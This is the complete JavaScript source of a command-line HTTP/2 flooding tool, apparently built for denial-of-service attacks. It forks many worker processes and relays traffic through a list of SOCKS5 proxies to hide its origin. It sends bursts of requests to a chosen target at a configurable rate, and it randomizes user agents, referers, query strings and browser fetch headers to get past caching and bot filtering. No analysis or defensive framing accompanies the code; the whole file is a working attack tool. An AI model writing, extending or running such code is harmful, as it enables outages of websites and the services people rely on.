const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node zaparka.js target time rate thread proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

function connectSocks5(proxyHost, proxyPort, targetHost, targetPort, callback) {
    const socket = net.createConnection({
        host: proxyHost,
        port: proxyPort
    });

    socket.setTimeout(5000);

    socket.on('connect', () => {
        const authBuffer = Buffer.from([
            0x05, // SOCKS version 5
            0x01, // number of auth methods
            0x00  // no authentication
        ]);
        socket.write(authBuffer);
    });

    socket.on('data', (data) => {
        if (data.length >= 2) {
            if (data[0] === 0x05 && data[1] === 0x00) {
                const requestBuffer = Buffer.from([
                    0x05, // version
                    0x01, // command: CONNECT
                    0x00, // reserved
                    0x03, // address type: domain name
                    targetHost.length, // domain length
                    ...Buffer.from(targetHost), // domain
                    (targetPort >> 8) & 0xFF, // port high byte
                    targetPort & 0xFF        // port low byte
                ]);
                socket.write(requestBuffer);
            } else if (data[0] === 0x05 && data[1] === 0x00 && data.length > 4) {
                callback(null, socket);
            } else {
                socket.destroy();
                callback(new Error('SOCKS5 connection failed'), null);
            }
        }
    });

    socket.on('timeout', () => {
        socket.destroy();
        callback(new Error('SOCKS5 timeout'), null);
    });

    socket.on('error', (err) => {
        socket.destroy();
        callback(err, null);
    });
}

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1",
        "te": "trailers"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }

    if (Math.random() > 0.7) {
        headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(130, 131)}", "Not_A Brand";v="8"`;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = randomElement(['"Windows"', '"macOS"', '"Linux"']);
    }

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const parsedProxy = proxyAddr.split(":");
    const proxyHost = parsedProxy[0];
    const proxyPort = parseInt(parsedProxy[1]);

    connectSocks5(proxyHost, proxyPort, parsedTarget.host, 443, (err, socket) => {
        if (err || !socket) return;

        socket.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: socket,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 50,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: socket,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.on("error", () => {
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            socket.destroy();
        });

        client.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            socket.destroy();
        });

        tlsConn.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            socket.destroy();
        });

        tlsConn.on("end", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            socket.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
